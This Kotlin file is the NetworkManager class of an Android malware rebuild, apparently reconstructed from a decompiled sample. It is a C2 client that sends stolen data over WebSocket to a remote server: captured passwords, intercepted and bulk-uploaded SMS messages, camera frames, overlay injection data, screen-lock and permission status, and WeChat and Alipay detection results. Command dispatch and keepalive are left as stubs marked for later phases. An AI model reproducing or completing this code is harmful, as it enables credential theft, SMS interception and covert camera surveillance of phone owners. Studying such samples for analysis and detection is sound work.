package com.storm.safe.rock.service.modules

import android.content.Context
import android.util.Log
import com.storm.safe.rock.network.DataSyncClient
import org.json.JSONObject

/**
 * Coordinates all C2 communication via DataSyncClient.
 *
 * Reverse-engineered from JADX reference: NetworkManager (C0323a8) with 18 inner classes.
 * Each inner class corresponds to a send/upload method that wraps data in a JSON envelope
 * and transmits via the WebSocket client.
 *
 * Usage:
 * 1. Call [initialize] with a Context to create the DataSyncClient.
 * 2. Call [connectToServer] with URL and deviceId to start the connection.
 * 3. Use the typed send methods to push data to the C2 server.
 */
class NetworkManager {

    companion object {
        private const val TAG = "NetworkManager"
    }

    // --- State ---

    private var dataSyncClient: DataSyncClient? = null

    var serverUrl: String = ""
        private set

    var deviceId: String = ""
        private set

    private var keepAliveStarted: Boolean = false

    // --- Lifecycle ---

    /**
     * Create the DataSyncClient and prepare for connections.
     * Matches JADX: NetworkManager$initialize$3
     */
    fun initialize(context: Context) {
        Log.d(TAG, "Initializing NetworkManager")
        dataSyncClient = DataSyncClient(
            context,
            onMessageCallback = { message -> handleRemoteCommand(message) },
            onConnectionChanged = { connected ->
                Log.d(TAG, "Connection state changed: $connected")
            }
        )
    }

    /**
     * Set the C2 server URL and deviceId, then connect.
     * Matches JADX: NetworkManager$connectToServer$1
     */
    fun connectToServer(url: String, deviceId: String) {
        this.serverUrl = url
        this.deviceId = deviceId
        dataSyncClient?.let { client ->
            client.serverUrl = url
            client.deviceId = deviceId
            Log.i(TAG, "Connecting to $url with deviceId=$deviceId")
            client.connect()
        }
    }

    /**
     * Start periodic WebSocket keepalive pings.
     * Matches JADX: NetworkManager$startWebSocketKeepAlive$1$1
     *
     * Stub: real timer-based keepalive will be implemented in Phase 3.
     */
    fun startWebSocketKeepAlive() {
        if (keepAliveStarted) return
        keepAliveStarted = true
        Log.d(TAG, "WebSocket keepalive started (stub)")
        // Phase 3: implement periodic ping via coroutine/timer every 30s
    }

    /**
     * Parse and dispatch an incoming remote command.
     * Matches JADX: NetworkManager$handleRemoteCommand$1
     *
     * Stub: real command dispatch will be implemented in Phase 8.
     */
    fun handleRemoteCommand(json: String) {
        try {
            val command = JSONObject(json)
            Log.d(TAG, "Received remote command: ${command.optString("command", "unknown")}")
            // Phase 8: dispatch to CommandHandler based on command type
        } catch (e: Exception) {
            Log.w(TAG, "Failed to parse remote command", e)
        }
    }

    // --- Generic event sender ---

    /**
     * Send a generic event with the given type and data payload.
     * Matches JADX: NetworkManager$sendEvent$2
     */
    fun sendEvent(type: String, data: JSONObject) {
        val client = dataSyncClient ?: return
        try {
            val envelope = buildEnvelope(type, data)
            client.send(envelope.toString())
            Log.d(TAG, "Event sent: $type")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send event: $type", e)
        }
    }

    // --- Typed send methods ---

    /**
     * Send password capture data.
     * Matches JADX: NetworkManager$sendPasswordData$1
     */
    fun sendPasswordData(data: JSONObject) {
        sendTypedMessage("password_data", data)
    }

    /**
     * Send intercepted incoming SMS.
     * Matches JADX: NetworkManager$sendIncomingSms$1
     */
    fun sendIncomingSms(data: JSONObject) {
        sendTypedMessage("incoming_sms", data)
    }

    /**
     * Batch upload SMS messages.
     * Matches JADX: NetworkManager$uploadSms$1
     */
    fun uploadSms(data: JSONObject) {
        sendTypedMessage("sms_upload", data)
    }

    /**
     * Send a camera frame (base64-encoded image).
     * Matches JADX: NetworkManager$sendCameraFrame$1
     */
    fun sendCameraFrame(base64Image: String, mode: String) {
        val client = dataSyncClient ?: return
        try {
            val frameData = JSONObject().apply {
                put("image", base64Image)
                put("mode", mode)
                put("timestamp", System.currentTimeMillis())
            }
            val envelope = buildEnvelope("camera_frame", frameData)
            client.send(envelope.toString())
            Log.d(TAG, "Camera frame sent: mode=$mode")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send camera frame", e)
        }
    }

    /**
     * Upload injection UI data.
     * Matches JADX: NetworkManager$uploadInjectionData$1
     */
    fun uploadInjectionData(data: JSONObject) {
        sendTypedMessage("injection_data", data)
    }

    /**
     * Send permission status update.
     * Matches JADX: NetworkManager$sendPermissionsUpdate$1
     */
    fun sendPermissionsUpdate(data: JSONObject) {
        sendTypedMessage("permissions_update", data)
    }

    /**
     * Send permission grant/deny response.
     * Matches JADX: NetworkManager$sendPermissionResponse$1
     */
    fun sendPermissionResponse(data: JSONObject) {
        sendTypedMessage("permission_response", data)
    }

    /**
     * Send screen lock state.
     * Matches JADX: NetworkManager$sendScreenLockStatus$1
     */
    fun sendScreenLockStatus(data: JSONObject) {
        sendTypedMessage("screen_lock_status", data)
    }

    /**
     * Send an operation log entry.
     * Matches JADX: NetworkManager$sendOperationLog$1
     */
    fun sendOperationLog(data: JSONObject) {
        sendTypedMessage("operation_log", data)
    }

    /**
     * Send WeChat detection status.
     * Matches JADX: NetworkManager$sendWechatDetectionStatus$1
     */
    fun sendWechatDetectionStatus(data: JSONObject) {
        sendTypedMessage("wechat_detection", data)
    }

    /**
     * Send Alipay detection status.
     * Matches JADX: NetworkManager$sendAlipayDetectionStatus$1
     */
    fun sendAlipayDetectionStatus(data: JSONObject) {
        sendTypedMessage("alipay_detection", data)
    }

    /**
     * Send auto-password detection status.
     * Matches JADX: NetworkManager$sendAutoPasswordDetectionStatus$1
     */
    fun sendAutoPasswordDetectionStatus(data: JSONObject) {
        sendTypedMessage("auto_password_detection", data)
    }

    /**
     * Notify the local Go daemon service with full config.
     * Matches JADX: NetworkManager$notifyLocalServiceFullConfig$1
     */
    fun notifyLocalServiceFullConfig(data: JSONObject) {
        sendTypedMessage("local_service_config", data)
    }

    // --- Test support ---

    /**
     * Inject a test DataSyncClient for unit testing.
     * Package-private visibility — only used by NetworkManagerTest.
     */
    internal fun setTestClient(client: DataSyncClient, deviceId: String) {
        this.dataSyncClient = client
        this.deviceId = deviceId
    }

    // --- Private helpers ---

    /**
     * Build a JSON envelope and send via DataSyncClient.
     * Common pattern shared by all typed send methods.
     */
    private fun sendTypedMessage(type: String, data: JSONObject) {
        val client = dataSyncClient ?: return
        try {
            val envelope = buildEnvelope(type, data)
            client.send(envelope.toString())
            Log.d(TAG, "Message sent: $type")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send $type", e)
        }
    }

    /**
     * Build the standard JSON envelope used by all send methods.
     *
     * Format: `{"type":"<type>","sessionId":"<deviceId>","data":{...},"timestamp":<ms>}`
     */
    private fun buildEnvelope(type: String, data: JSONObject): JSONObject {
        return JSONObject().apply {
            put("type", type)
            put("sessionId", deviceId)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }
    }
}
